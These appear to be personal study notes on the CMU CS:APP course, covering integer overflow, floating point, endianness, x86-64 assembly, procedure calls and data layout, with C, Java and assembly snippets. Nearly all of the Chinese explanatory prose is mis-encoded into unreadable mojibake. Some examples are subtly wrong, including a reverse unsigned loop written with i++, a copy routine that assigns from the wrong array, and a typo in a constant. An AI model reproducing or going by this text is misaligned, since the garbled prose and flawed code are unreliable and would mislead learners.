# CSAPP

[TOC]

è¯¾ç¨‹é“¾æ¥ï¼š[15-213: Introduction to Computer Systems (cmu.edu)](https://www.cs.cmu.edu/~213/)

15å¹´é“¾æ¥ï¼š[15-213: Introduction to Computer Systems / Schedule Fall 2015 (cmu.edu)](https://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/schedule.html)

lab é“¾æ¥ï¼š[CS:APP3e, Bryant and O'Hallaron (cmu.edu)](http://csapp.cs.cmu.edu/3e/labs.html)

## ä¸€. ä»‹ç»

### 1. æœ‰è¶£çš„ç°è±¡

* åœ¨è®¡ç®—æœºä¸­æ˜¯å¦æ‰€æœ‰æ•°å­—éƒ½æ»¡è¶³ $x^2\ge0$ ï¼Ÿ

  å¯¹äºæµ®ç‚¹æ•°æ¥å…¨éƒ¨æ»¡è¶³ã€‚å¯¹äºæ•´æ•°ä¸­ä¸ä¸€å®šï¼š

  ```sh
  (gdb) print 40000*40000
  $1 = 1600000000
  (gdb) print 50000*50000
  $2 = -1794967296
  ```

  å³è®¡ç®—æœºä¸­å¯¹äº int å­˜å‚¨ä¸º 32 ä½ï¼Œå¯èƒ½å­˜åœ¨æº¢å‡ºçš„æƒ…å†µã€‚

* åœ¨è®¡ç®—æœºä¸­æ˜¯å¦æ‰€æœ‰æ•°å­—æ»¡è¶³å‡å‘ç»“åˆå¾‹ $(x+y)+z=x+(y+z)$ ï¼Ÿ

  å¯¹äºæ•´æ•°æ¥å…¨éƒ¨æ»¡è¶³ï¼Œç„¶è€Œå¯¹äºæµ®ç‚¹æ•°å°±ä¸ä¸€å®šäº†ï¼š

  ```sh
  (gdb) print (1e20+-1e20)+3.14
  $3 = 3.1400000000000001
  (gdb) print 1e20+(-1e20+3.14)
  $4 = 0
  ```

  éƒ½æºäºå…¶ä½¿ç”¨æœ‰é™ä½çš„ç»„åˆæ¥è¡¨ç¤ºæ— é™èŒƒå›´çš„æ•°å­—ï¼Œä»è€Œå¯¼è‡´è®¡ç®—é”™è¯¯çš„æƒ…å†µã€‚

å¯¹äº 90% çš„æƒ…å†µä¸‹éƒ½æ— éœ€è€ƒè™‘è¿™ç§æƒ…å†µï¼Œä½†æ˜¯å¦‚æœé‡åˆ°ç³»ç»Ÿå®‰å…¨æˆ–è€…ç«ç®­è®¾è®¡çš„æ—¶å€™å¿…é¡»è¦æ³¨æ„è¿™äº›æƒ…å†µã€‚

* åœ¨ C/C++ ä¸­å¯¹äºæ•°ç»„éšæœºè®¿é—®ä¸ä¼šå¯¹æ•°ç»„ç´¢å¼•è¿›è¡Œè¾¹ç•Œ æ£€æŸ¥ï¼š

  ```c
  typedef struct {
          int a[2];
          double d;
  } struct_t;
  
  double fun(int i) {
          volatile struct_t s;
          s.d = 3.14;
          s.a[i] = 1073741824;
          return s.d;
  }
  ```

  å¯¹äºä¸åŒæƒ…å†µä¼šæœ‰ä»¥ä¸‹è¾“å‡ºï¼š

  ```sh
  0	->	3.140000
  1	->	3.140000
  2	->	3.140000
  3	->	2.000001
  4	->	3.140000
  5	->	3.140000
  6	->	*** stack smashing detected ***: terminated
  [1]    4500 abort (core dumped)  ./a.out
  ```

  å½“è¾“å…¥ 6 çš„æ—¶å€™å°±ä¼šå¯¼è‡´ç¨‹åºå´©æºƒã€‚

  ![image-20220810014027959](csapp.assets/image-20220810014027959.png)

  ç”±å›¾æ‰€ç¤ºï¼Œå½“ i ä¸º 0 æˆ–è€… 1 çš„æ—¶å€™ä¼šä¿®æ”¹å±äºå…¶æ‰€åœ¨çš„å†…å­˜åŒºåŸŸï¼Œå½“ä¸º2ï¼Œ3çš„æ—¶å€™å°±æ˜¯ä¿®æ”¹ d æ‰€æœ‰çš„å†…å­˜åŒºåŸŸï¼Œå½“ä¸º 4ï¼Œ5ï¼Œ6 çš„æ—¶å€™å¯èƒ½ä¿®æ”¹äº†ç»´æŒç¨‹åºè¿è¡Œçš„çŠ¶æ€ï¼Œå°±ä¼šå¯¼è‡´ç¨‹åºé”™è¯¯ã€‚

* å†…å­˜è®¿é—®ç­–ç•¥ï¼š

  ```c
  void copyij(int src[][], int dest[][]) {
          for(int i = 0; i < 2048; i++)
                  for(int j = 0; j < 2048; j++)
                          src[i][j] = dest[i][j];
  }
  
  
  void copyji(int src[][], int dest[][]) {
          for(int i = 0; i < 2048; i++)
                  for(int j = 0; j < 2048; j++)
                          src[j][i] = dest[j][i];
  }
  ```

  åœ¨è¿™ä¸ªç¨‹åºä¸­ï¼Œå‰è€…è¿è¡Œé€Ÿåº¦è¦æ¯”åè€…å¿« 20 å€å·¦å³ã€‚

  å¯¹äºä¸€ä¸ªäºŒç»´æ•°ç»„æ¥è¯´ï¼Œå…¶åœ¨è®¡ç®—æœºä¸­ä¿å­˜çš„æ–¹å¼ä¸ºä¸€ç‰‡è¿ç»­ç©ºé—´ï¼ŒæŒ‰åˆ—è®¿é—®ä¼šè®©æŒ‡å‘å†…å­˜åŒºåŸŸçš„æŒ‡é’ˆä¸æ–­çš„è·³æ¥è·³å»ï¼Œä¸æ–­è®¡ç®—ä¸‹ä¸€ä¸ªéœ€è¦è®¿é—®å†…å­˜åŒºåŸŸçš„åœ°å€ï¼›è€ŒæŒ‰è¡Œè®¿é—®åªéœ€è¦å°†æŒ‡é’ˆç§»å‘ä¸‹ä¸€ç‰‡å†…å­˜åŒºåŸŸå³å¯ã€‚

  ![image-20220810015314566](csapp.assets/image-20220810015314566.png)

## äºŒ. æ•°å­—è¡¨ç¤º

###  1. ç¬¦å·æ•° signed VS unsigned

åœ¨ C/C++ æ•°å­—æ¯”è¾ƒä¸­ï¼Œå¦‚æœç±»å‹ä¸åŒæ¯”è¾ƒå°±ä¼šå¯¼è‡´æ½œåœ¨çš„ bug ã€‚

| è¯„ä¼°æ–¹å¼ |      A       | å…³ç³» |         B         |
| :------: | :----------: | :--: | :---------------: |
| unsigned |      -1      |  >   |         0         |
| unsigned |  2147483647  |  <   |    -2147483648    |
| unsigned | (unsigned)-1 |  >   |        -2         |
|  signed  |  2147483647  |  >   | (int)21477483648U |

å› æ­¤æœ‰ä»¥ä¸‹ç»“è®ºï¼š

* æœ‰ç¬¦å·çš„æ­£æ•°æ°¸è¿œå°äºè½¬ä¸ºæ— ç¬¦å·æ•°å­—çš„æœ‰ç¬¦å·è´Ÿæ•°ã€‚

* å¯¹äº $-2^{31}=-2147483648$ æ¥è¯´ï¼Œåœ¨ int ç±»å‹ä¸­ï¼Œ $-(-2147483648) = -2147483648$ï¼Œè¿™æ˜¯éœ€è¦æ³¨æ„çš„æƒ…å†µã€‚

* å¯¹äº unsigned ç±»å‹æ¥è¯´ï¼Œä¸é€‚åˆåå‘éå†æ•°ç»„ï¼š

    ```c
    unsigned int i = 5;
    for(;i>=0;i++);
    ```

* å› ä¸ºå½“ $i=0; i=i-1$ çš„æ—¶å€™ï¼Œ$i$ ä¼šç­‰äº $2^{32}-1=4294967295$

* å¦‚æœæœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°ä¸€èµ·è¿ç®—ï¼Œæœ‰ç¬¦å·æ•°ä¼šè½¬æ¢ä¸ºæ— ç¬¦å·æ•°ã€‚
* `sizeof()` è¿”å›çš„æ˜¯æ— ç¬¦å·æ•°ã€‚

### 2. æ•°å­—è¿ç®—

* æº¢å‡º

  æº¢å‡ºåˆ†ä¸ºæ­£æº¢å‡ºå’Œè´Ÿæº¢å‡ºï¼Œæ­£æº¢å‡ºæ˜¯å› ä¸ºä¸¤ä¸ªæ­£æ•°ç›¸åŠ ç»“æœè¿‡å¤§å¯¼è‡´æº¢å‡ºå¾—åˆ°è´Ÿæ•°ï¼Œè´Ÿæº¢å‡ºæ˜¯å› ä¸ºä¸¤ä¸ªè´Ÿæ•°ç›¸åŠ ç»“æœè¿‡å°å¯¼è‡´æº¢å‡ºå¾—åˆ°æ­£æ•°ã€‚

  å¯¹äºæœ‰ç¬¦å·æ•°æ¥è¯´æœ‰ä¸¤ç§æº¢å‡ºï¼Œå¯¹äºæ— ç¬¦å·æ•°æ¥è¯´åªæœ‰ä¸€ç§æº¢å‡ºã€‚

* ä½è¿ç®—

  å·¦ç§»å³ç§»ï¼šå·¦ç§»ç›¸å½“äºä¹˜2ï¼Œå³ç§»ç›¸å½“äºé™¤ä»¥2ï¼Œä½†æ˜¯åˆæœ‰ä¸€äº›ç»†å¾®çš„åŒºåˆ«ï¼š

  ```c
  printf("%d,%d\n", 3 / 2, -3 / 2);
  // 1,-1
  printf("%d,%d\n", 3 >> 1, -3 >> 1);
  // 1,-2
  ```

  å¯¹äºå³ç§»ä¸€ä½æ¥è¯´ï¼Œç›¸å½“äºé™¤ä»¥ 2 å†è¿›è¡Œå‘ä¸‹å–æ•´ï¼Œæ¯”å¦‚ $3>>1$ çº¦ä¸º 1.5 ä½†æ˜¯å– 1ï¼Œ-3>>1 çº¦ä¸º -1.5 å‘ä¸‹å–æ•´å–ä¸º2ã€‚

* ä»€ä¹ˆæ—¶å€™åº”è¯¥ä½¿ç”¨æ— ç¬¦å·æ•°è¿›è¡Œè¿ç®—ï¼Ÿ

  å–æ¨¡è¿ç®—ï¼Œhash è¿ç®—ç­‰ç­‰

### 3. æµ®ç‚¹æ•°

IEEE 754 è¡¨ç¤ºæ³•ï¼š

![image-20220812073136970](csapp.assets/image-20220812073136970.png)

å› æ­¤ä¸€ä¸ªäºŒè¿›åˆ¶æµ®ç‚¹æ•°å¯ä»¥è¡¨ç¤ºä¸º $(-1)^sM\cdot2^E$ï¼Œå…¶ä¸­

* s è¡¨ç¤ºç¬¦å·ä½

* exp è¡¨ç¤ºç²¾åº¦ï¼Œä¸èƒ½ä½å…¨ 0 ä¹Ÿä¸èƒ½ä¸ºå…¨ 1ï¼Œæœ€ç»ˆè¡¨ç¤ºçš„ä½æ•°ä¸º $E=\text {exp-bias,\ bias}=2^{k-1}-1$ã€‚

  |  ç±»åˆ«  |   exp    |      E       | bias |
  | :----: | :------: | :----------: | :--: |
  | å•ç²¾åº¦ | [1,254]  |  [-126,127]  | 127  |
  | åŒç²¾åº¦ | [1,2046] | [-1022,1023] | 1023 |

  

* frac è¡¨ç¤ºåŸºæ•° Mï¼Œå…¶è¡¨ç¤ºèŒƒå›´åœ¨ $[1.0,2)$ ä¹‹é—´ï¼Œæœ‰ä¸€ä¸ªéšå«å‰ç½® 1ï¼š

  å½“ frac ä¸º 000...0 æ—¶è¡¨ç¤º 1.0 ä¸ºæœ€å°å€¼ï¼Œå½“ frac ä¸º 111...1 æ—¶å€™è¡¨ç¤º $(2.0-\epsilon)_2$ ä¸ºæœ€å¤§å€¼

ä¸¾ä¾‹ï¼š

![image-20220812080112594](csapp.assets/image-20220812080112594.png)



ç”±äº frac éƒ¨åˆ†å§‹ç»ˆéƒ½æœ‰ä¸€ä¸ªéšå«å‰å¯¼ 1ï¼Œå› æ­¤è¡¨ç¤ºæ•°å­— 0 çš„æ—¶å€™ååˆ†ä¸æ–¹ä¾¿ã€‚

IEEE 754 æ¨å‡ºéæ ‡å‡†è¡¨ç¤ºæ³•ï¼Œå½“ exp = 000...0 æ—¶å€™ï¼Œfrac å‰å¯¼ä¸º 0ï¼š

* å½“ frac ä¸º 000...0 çš„æ—¶å€™å°±è¡¨ç¤ºä¸º 0 å€¼ï¼Œå¹¶ä¸”ç”±äºç¬¦å·ä½ s çš„å­˜åœ¨ä¼šæœ‰ +0 å’Œ -0 çš„åŒºåˆ†
* å½“ frac $\neq$ 000...0 çš„æ—¶å€™å°±è¡¨ç¤ºååˆ†æ¥è¿‘ä¸ 0 çš„å€¼ã€‚

è¿˜æœ‰å‡ ç§ç‰¹æ®Šçš„å€¼ï¼š

* å½“ exp å…¨ä¸º 111...1 ä¸” frac = 000...0 çš„æ—¶å€™å°±è¡¨ç¤ºæ— ç©·å¤§

  æ¯”å¦‚ $1.0/0.0=-1.0/-0.0=+\infin, 1.0/-0.0=-\infin$

* å½“ exp  å…¨ä¸º 111...1 ä¸” frac â‰  000...0 çš„æ—¶å€™å°±è¡¨ç¤º NaN

  æ¯”å¦‚ $\infin+\infin$

```c
double a = 1.0/0.0;
double b = 1.0/-0.0;
printf("%lf, %lf, %lf\n", a, b, a+b);
// è¾“å‡º
// inf, -inf, -nan
```

**èˆå…¥æ–¹å¼**ï¼š

![image-20220812085921367](csapp.assets/image-20220812085921367.png)

æœ€ç‰¹æ®Šçš„æ˜¯å‘æœ€è¿‘å¶æ•°(Nearest Even)èˆå…¥ã€‚

> å¯¹äºæµ®ç‚¹æ•°æ¥è¯´ï¼Œå¹¶ä¸å…·å¤‡åŠ æ³•ç»“åˆå¾‹ï¼Œæ¯”å¦‚åŠ æ•°ä¹‹é—´ç›¸å·®è¾ƒå¤§ ï¼Œè¯¦è§<a href='#1. æœ‰è¶£çš„ç°è±¡'>é“¾æ¥</a>.

å› æ­¤å¯¹äºç¨‹åºå‘˜æ¥è¯´ï¼Œå¦‚æœä½¿ç”¨æµ®ç‚¹æ•°ç”¨äºè¡¨ç¤ºå˜åŒ–æå¤§çš„æ•°æ®çš„æ—¶å€™ï¼Œéœ€è¦è€ƒè™‘æµ®ç‚¹æ•°å¯èƒ½å­˜åœ¨çš„å„ç§ bug æƒ…å†µï¼Œæœ‰å¯èƒ½ç›¸åŒçš„æ•°æ®åœ¨ç†è®ºä¸Šç»“æœå®Œå…¨ç›¸åŒä½†æ˜¯å®é™…ä¸­ä¼šå¾—åˆ°ä¸åŒç­”æ¡ˆçš„æƒ…å†µï¼Œå› æ­¤éœ€è¦æ ¼å¤–æ³¨æ„æ¥ä¿è¯ç¨‹åºçš„é²æ£’æ€§ã€‚

 **ç±»å‹è½¬æ¢**ï¼š

|       From       |         To         | Equal |
| :--------------: | :----------------: | :---: |
|       int        |    (int)(float)    | False |
|       int        |   (int)(double)    | True  |
|      float       |  (float)(double)   | True  |
|      double      |  (double)(float)   | False |
|      float       |     -(-float)      | True  |
|  double > float  | - float > - double | True  |
|   d * d >= 0.0   |                    | True  |
| (d + f) - d == f |                    | False |

### 4. å¤§ç«¯å’Œå°ç«¯å­˜å‚¨

å¤§ç«¯å­˜å‚¨å³å…ˆå°†æ•°å­—çš„é«˜ä½åˆ°ä½ä½ä¾æ¬¡å­˜å‚¨ï¼Œæ¯”å¦‚å¯¹äºæ•°å­— 0x12345678ï¼Œåœ¨è®¡ç®—æœºçš„ä¸­å¤§ç«¯çš„è¡¨ç¤ºå½¢å¼ä¸º `12 34 56 78`ï¼›å°ç«¯å­˜å‚¨å³å…ˆå°†æ•°å­—çš„ä½ä½åˆ°é«˜ä½ä¾æ¬¡å­˜å‚¨ï¼Œå­˜å‚¨å½¢å¼ä¸º `78 56 34 12`ã€‚

C/C++åˆ¤æ–­å¤§å°ç«¯ï¼š

```c
int main() {
    int a = 0x12345678;
    char* b = (char *)&a;
    if (b[0] == 0x78) printf("small endian: %.2x.\n", b[0]);
    else if(b[0] == 0x12) printf("big endian: %.2x.\n", b[0]);
    else printf("error: %.2x.\n", b[0]);
    return 0;
}
```

Java åˆ¤æ–­å¤§å°ç«¯ï¼ˆä½¿ç”¨ unsafe ç±»ï¼‰ï¼š

```java
public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException {
    Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
    theUnsafe.setAccessible(true);
    Unsafe unsafe = (Unsafe) theUnsafe.get(null);
    System.out.println(unsafe);
    long a = unsafe.allocateMemory(8L);
    unsafe.putLong(a,0x12345678);
    byte b = unsafe.getByte(a);
    if (b == 0x12) System.out.println("Big Endian");
    else if (b == 0x78) System.out.println("Small Endian");
    else System.out.println("Error:" + b);
}
```

## ä¸‰. ç¨‹åºæœºå™¨çº§åˆ«è¡¨ç¤º

### 1. æ±‡ç¼–è¯­è¨€

å°† C/C++ è½¬è¯‘æˆæ±‡ç¼–è¯­è¨€ï¼š

```sh
gcc -Og -S sum.c
# -Og æ˜¯ç”¨äºç”Ÿæˆä¾¿äºè°ƒè¯•çš„æ±‡ç¼–ä»£ç 
```

æˆ–è€…é€šè¿‡åæ±‡ç¼–å¾—åˆ°æ±‡ç¼–è¯­è¨€ï¼š

```sh
# ç¼–è¯‘
gcc sum.c -o sum
# åæ±‡ç¼–
objdump -d sum > sum.d
```

ä¹Ÿå¯ä»¥ä½¿ç”¨ gdb è¿›è¡Œåæ±‡ç¼–ï¼š

```sh
gdb sum
# disassemble åé¢æ˜¯å‡½æ•°å
disassemble sumstore
```

ç”Ÿæˆæ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼š

```assembly
    .file   "sum.c"
    .text
    .globl  plus
    .type   plus, @function
plus:
.LFB39:
    .cfi_startproc
    endbr64
    leaq    (%rdi,%rsi), %rax
    ret
    .cfi_endproc
.LFE39:
    .size   plus, .-plus
    .globl  sumstore
    .type   sumstore, @function
sumstore:
.LFB40:
    .cfi_startproc
    endbr64
    pushq   %rbx
    .cfi_def_cfa_offset 16
    .cfi_offset 3, -16
    movq    %rdx, %rbx
    call    plus
    movq    %rax, (%rbx)
    popq    %rbx
    .cfi_def_cfa_offset 8
    ret
    .cfi_endproc
.LFE40:
    .size   sumstore, .-sumstore
    .section    .rodata.str1.1,"aMS",@progbits,1
.LC0:
    .string "%ld + %ld --> %ldd\n"
    .text
    .globl  main
    .type   main, @function
```

å…¶ä¸­ä»¥ `.` å¼€å¤´çš„ä¸æ˜¯æŒ‡ä»¤ï¼Œæ˜¯ç”¨äºæä¾›ç»™è°ƒè¯•å™¨ä¿¡æ¯æœ‰å…³ï¼Œæ–¹ä¾¿å…¶å®šä½ç¨‹åºçš„å„ä¸ªéƒ¨åˆ†ã€‚æ¯”å¦‚ `.globl` å…³é”®å­—å¯ä»¥ç”¨æ¥è®©ä¸€ä¸ªç¬¦å·å¯¹ Linker å¯è§ï¼Œå¯ä»¥ä¾›å…¶ä»–é“¾æ¥å¯¹è±¡è¿›è¡Œä½¿ç”¨ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨åç»­æ˜¯ä¸€ä¸ªå…¨å±€å¯è§çš„åå­—ï¼Œå¯èƒ½æ˜¯å˜é‡ä¹Ÿå¯èƒ½æ˜¯å‡½æ•°åã€‚

åœ¨æœºå™¨çº§åˆ«ï¼ŒåŸºæœ¬æ•°æ®ç»“æ„åŸºæœ¬ä¸å­˜åœ¨ï¼Œæ˜¯ç”±ç¼–è¯‘å™¨äººå·¥è¿›è¡Œæ„å»ºçš„ã€‚

### 2. x86 æŒ‡ä»¤

![image-20220824150515715](csapp.assets/image-20220824150515715.png)

å¤§éƒ¨åˆ†å¯„å­˜å™¨ä¸åŸæœ‰å‘½åæ—¶å€™çš„ç”¨é€”å·²æ— å…³ï¼Œä½†æ˜¯ rsp å’Œ rbp è¿™ä¸¤ä¸ªå¯„å­˜å™¨ä»ä¿ç•™äº†å…¶åŸæœ‰çš„ç”¨é€”ã€‚sp è¡¨ç¤º stack point å³ä¸ºæ ˆæŒ‡é’ˆï¼Œbp è¡¨ç¤º base pointer è¡¨ç¤ºåŸºæŒ‡é’ˆã€‚

> å¯¹äºä¸€èˆ¬å‡½æ•°æ¥è¯´ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å­˜æ”¾åœ¨ %rdiï¼Œç¬¬äºŒä¸ªå‚æ•°å­˜æ”¾åˆ° %rsi ä¸­ï¼Œä»å‡½æ•°ä¸­è¿”å›ç»“æœå­˜æ”¾åˆ° %rax ä¸­ã€‚

* movq A,B æŒ‡ä»¤

  ä¸ºäº†ç¡¬ä»¶è®¾è®¡äººå‘˜çš„æ–¹ä¾¿ï¼Œä¸å…è®¸ä»ä¸€ä¸ªå†…å­˜ä½ç½®å¤åˆ¶åˆ°å¦ä¸€ä¸ªå†…å­˜ä½ç½®ï¼Œå…è®¸çš„æ“ä½œç›®æ ‡å¦‚ä¸‹å›¾ã€‚

  ![image-20220824151306623](csapp.assets/image-20220824151306623.png)

  `(%rax)` è¡¨ç¤º rax å¯„å­˜å™¨ä¸­å­˜å‚¨çš„ä¸ºä¸€ä¸ªå†…å­˜åœ°å€ï¼Œä½¿ç”¨ `()` è¡¨ç¤ºå–å‡ºè¿™ä¸ªå†…å­˜ä¸­çš„æ•°æ®ã€‚

  `D(%rax)` è¡¨ç¤ºåœ¨è¿™ä¸ªå†…å­˜åœ°å€ä¸Šè¿›è¡Œåç§»ï¼Œç„¶åå–å‡ºå†…å®¹ï¼Œç›¸å½“äº `(%rax + D)`

  `D(%rax, %rbx, S)` ç›¸å½“äº `(%rax + s * %rbx + d)`ï¼Œå…¶ä¸­ %rbx ä¸å¯ä»¥è¢«æ›¿æ¢ä¸º rsp, S åªèƒ½å– 1,2,4,8

* leaq src, dst

  src ä¸€èˆ¬æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œç”¨äºå°†è¡¨è¾¾å¼è®¡ç®—ç»“æœå­˜æ”¾åˆ° dst ä¸­ã€‚

  å¯¹äº `x * 12` è¿™ä¸ªæ“ä½œï¼š

  ```assembly
  leaq (%rdi, %rdi, 2), %rax	# t = x + x * 2
  salq $2, %rax	# t << 2
  ```

* ä½æ ‡è®°ï¼ˆåœ¨æ§åˆ¶æµä¸­ä¼šå…³æ³¨ï¼‰

  1. CFï¼ŒCarry Flag è¡¨ç¤ºè¿›ä½æ ‡è®°ï¼Œç”¨äº unsigned ç±»å‹
  2. SFï¼ŒSign Flagï¼Œç”¨äº signed ç±»å‹ï¼Œè¡¨ç¤º if res < 0
  3. ZFï¼ŒZero Flagï¼Œè®¡ç®—ç»“æœä¸º if res == 0
  4. OFï¼ŒOverflow Flagï¼Œç”¨äº signed ç±»å‹ï¼Œåˆ¤æ–­è¡¥ç æ˜¯å¦æº¢å‡º (a > 0 && b > 0 & res < 0) || (a < 0 && b < 0 && t >= 0)

* cmpq b, a

  ç›¸å½“äºè®¡ç®— a-b ä½†æ˜¯ä¸äº§ç”Ÿè®¡ç®—ç»“æœï¼Œåªæ”¹å˜ä½æ ‡è®°ã€‚

* testq b, a

  ç”¨äºè®¡ç®— a&bï¼Œä¸€èˆ¬éƒ½æ˜¯ä¸è‡ªå·±æ¯”è¾ƒï¼Œæ¯”å¦‚ `testq %rax, %rax`

  ZF = 1 if a & b == 0

  SF = 1 if a & b < 0

* set* æŒ‡ä»¤

  ![image-20220824165819964](csapp.assets/image-20220824165819964.png)

  `SETNE %rax` å°† ZF æ ‡å¿—å–åå­˜æ”¾åˆ° rax å¯„å­˜å™¨ä¸­ã€‚

* movzbl %al, %eax

  movzbl å…¨ç§° move with zero extension byte to longï¼Œå°† al ä¸­çš„å€¼ç§»åˆ° eax ä¸­ï¼Œå¹¶ä¸”å°†å‰©ä½™ä½ç½®é›¶ã€‚

* J* è·³è½¬æŒ‡ä»¤

  ![image-20220824170916935](csapp.assets/image-20220824170916935.png)

  `jmp xxx` è¡¨ç¤ºç›´æ¥è·³è½¬åˆ° xxx åœ°å€å¤„ã€‚

  `je xxx` è¡¨ç¤ºå¦‚æœ ZF = 1ï¼Œåˆ™è·³è½¬åˆ° xxx å¤„ã€‚

  å…¶ä»–ç±»ä¼¼ã€‚

### 3. Procedures è¿‡ç¨‹è°ƒç”¨

ç›¸å½“äºä¸€ä¸ªå‡½æ•°ï¼Œè§£é‡Šçš„è¯æ¯”è¾ƒç±»ä¼¼äºæ‰§è¡Œè¿‡ç¨‹ã€‚

é€šå¸¸æ­é…ä½¿ç”¨çš„æŒ‡ä»¤æœ‰ `push`ï¼Œ`pop` ä»¥åŠ`call`,  `ret`ã€‚

å¯¹äº push æ“ä½œï¼Œæ— æ³•ç›´æ¥æ“ä½œç«‹å³æ•°ï¼Œéœ€è¦é¦–å…ˆå°†ç«‹å³æ•°å­˜å‚¨åˆ°å¯„å­˜å™¨ä¸­ï¼Œç„¶å push å¯„å­˜å™¨ã€‚

ğŸ”µæ§åˆ¶æ‰§è¡Œæµç¨‹ï¼š

* `call xxx` ç›¸å½“äºå°†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ push åˆ° rsp ä¸­ï¼Œç„¶å jmp åˆ° xxx åœ°å€ã€‚
* `ret` ç›¸å½“äºä» rsp ä¸­ pop å‡ºæ ˆä¸­çš„åœ°å€ï¼Œå¹¶ä¸” jmp å›è¿™ä¸ªåœ°å€ã€‚

ğŸ”µæ§åˆ¶ä¼ é€’å‚æ•°ï¼š

å¯¹äºå‡½æ•°ä¼ é€’å‚æ•°æ¥è¯´ï¼Œå‰ 6 ä¸ªå‚æ•°åˆ†åˆ«ä¼ é€’ç»™ rdi, rsi, rdx, rcx, r8, r9 å¯„å­˜å™¨ï¼Œä¹‹åçš„å‚æ•°ä¼ é€’åˆ°æ ˆä¸­ï¼›è¿”å›å€¼ä¼ é€’åˆ° rax ä¸­ã€‚å¯¹äºæµ®ç‚¹æ•°ä¼šæœ‰ä¸“é—¨çš„å¯„å­˜å™¨ã€‚

ğŸ”µç®¡ç†å±€éƒ¨å‚æ•°

é€šå¸¸è¿™äº›å‚æ•°å’Œç¯å¢ƒå˜é‡ä¼šå­˜å‚¨åœ¨æ ˆçš„æ¯ä¸€ä¸ªå¯¹åº”çš„æ ˆå¸§ä¸­ã€‚ 

ğŸ”µå¯„å­˜å™¨ä¿å­˜è§„åˆ™

* `Caller Saved`ï¼šè°ƒç”¨è€…åœ¨è°ƒç”¨ `call` å‘½ä»¤ä¹‹å‰å°†ä¸´æ—¶å€¼ä¿å­˜åˆ°å…¶æ ˆå¸§ä¸­
* `Callee Saved`ï¼šè¢«è°ƒç”¨è€…åœ¨è¢«è°ƒç”¨ä¹‹å‰å°†ä¸´æ—¶å€¼ä¿å­˜åˆ°æ ˆå¸§ä¸­ï¼Œç»“æŸè°ƒç”¨æ—¶å€™æ¢å¤è°ƒç”¨è€…æ ˆå¸§ä¸­çš„ä¸´æ—¶å˜é‡ã€‚

![image-20220907140222269](csapp.assets/image-20220907140222269.png)

å½“è¿›è¡Œå‡½æ•°è°ƒç”¨æ—¶ï¼Œä¼šå°†è°ƒç”¨è€…çš„ä¿¡æ¯ï¼ˆä¸´æ—¶å˜é‡ï¼Œå¯é€‰å‚æ•°ï¼Œè°ƒç”¨è€…å’Œè¢«è°ƒç”¨è€…å¯„å­˜å™¨ä¿¡æ¯ï¼Œè¿”å›åœ°å€ï¼‰ç­‰å…¥æ ˆï¼Œç­‰å¾…è¢«è°ƒç”¨è€…å‡½æ•°æ‰§è¡Œå®Œæ¯•å†æ¢å¤åŸçŠ¶ã€‚

### 4. æ•°æ®ç»“æ„è¡¨ç¤º

ğŸ”µæ•°ç»„è¡¨ç¤º

åœ¨ C/C++ ä¸­ï¼š

```c
int i = 1;
int *p = &i;	// p = x
i ++;	// i = 2
p ++;	// p = x + 4;
```

å¯¹äºæŒ‡é’ˆè¿›è¡Œ `++` æ“ä½œï¼Œç›¸å½“äºæŒ‡é’ˆè·³å‘ä¸‹ä¸€ä¸ª int æœ‰æ•ˆåœ°å€ã€‚

å­¦ä¹ ä¸€ç»´æ•°ç»„ï¼ŒäºŒç»´æ•°ç»„ï¼Œç»“æ„ä½“åœ¨è®¡ç®—æœºçš„è¡¨ç¤ºå½¢å¼ã€‚

![image-20220902115945387](csapp.assets/image-20220902115945387.png)

<p>
    Cmp: Compiles(Y/N)
</p>
<p>
    Null: Possible numm pointer reference(Y/N)
</p>
<p>
    Size Value returned by sizeof()
</p>
<table>
<tr>
    <td>Ord</td>
    <td colspan=3>An</td>
    <td colspan=3>*An</td>
    <td colspan=3>**An</td>
</tr>
<tr>
    <td></td>
    <td>Cmp</td>
    <td>Null</td>
    <td>Size</td>
    <td>Cmp</td>
    <td>Null</td>
    <td>Size</td>
    <td>Cmp</td>
    <td>Null</td>
    <td>Size</td>
</tr>
<tr>
    <td>int A1[3]</td>
    <td>Y</td>
    <td>N</td>
    <td>12</td>
    <td>Y</td>
    <td>N</td>
    <td>4</td>
    <td>N</td>
    <td>-</td>
    <td>-</td>
</tr>
    <tr>
    <td>int *A2[3]</td>
    <td>Y</td>
    <td>N</td>
    <td>24</td>
    <td>Y</td>
    <td>N</td>
    <td>8</td>
    <td>Y</td>
    <td>Y</td>
    <td>4</td>
</tr>
    <tr>
    <td>int (*A3)[3]</td>
    <td>Y</td>
    <td>N</td>
    <td>8</td>
    <td>Y</td>
    <td>Y</td>
    <td>12</td>
    <td>Y</td>
    <td>Y</td>
    <td>4</td>
</tr>
    <tr>
    <td>int (*A4[3])</td>
    <td>Y</td>
    <td>N</td>
    <td>24</td>
    <td>Y</td>
    <td>N</td>
    <td>8</td>
    <td>Y</td>
    <td>Y</td>
    <td>4</td>
</tr>
</table>

å…¶ä¸­ A4 çš„å®šä¹‰ä¸ A2 çš„ç›¸åŒï¼Œ`[]` çš„ä¼˜å…ˆçº§è¦æ¯” `*` çš„ä¼˜å…ˆçº§è¦é«˜ã€‚

è€Œ A3 ç›¸å½“äºä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªæ•°ç»„ï¼š

![image-20220902131531072](csapp.assets/image-20220902131531072.png)



ğŸ”µç»“æ„ä½“è¡¨ç¤º

```c
struct rec {
    int a[4];
    size_t i;
    struct rec *next;
};
```

å¯¹åº”åœ¨è®¡ç®—æœºä¸­çš„ç®€æ˜“è¡¨ç°å½¢å¼ä¸ºï¼š

![image-20220902134052354](csapp.assets/image-20220902134052354.png)

æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š

1. è¶³å¤Ÿå¤§æ¥ä¿å­˜å„ä¸ªå±æ€§
2. æ ¹æ®å£°æ˜é¡ºåºåœ¨å†…å­˜ä¸­çš„æ’åˆ—é¡ºåº
3. æ ¹æ®åœ°å€å’Œåç§»é‡æ¥å®šä½åˆ°å¯¹åº”çš„å±æ€§

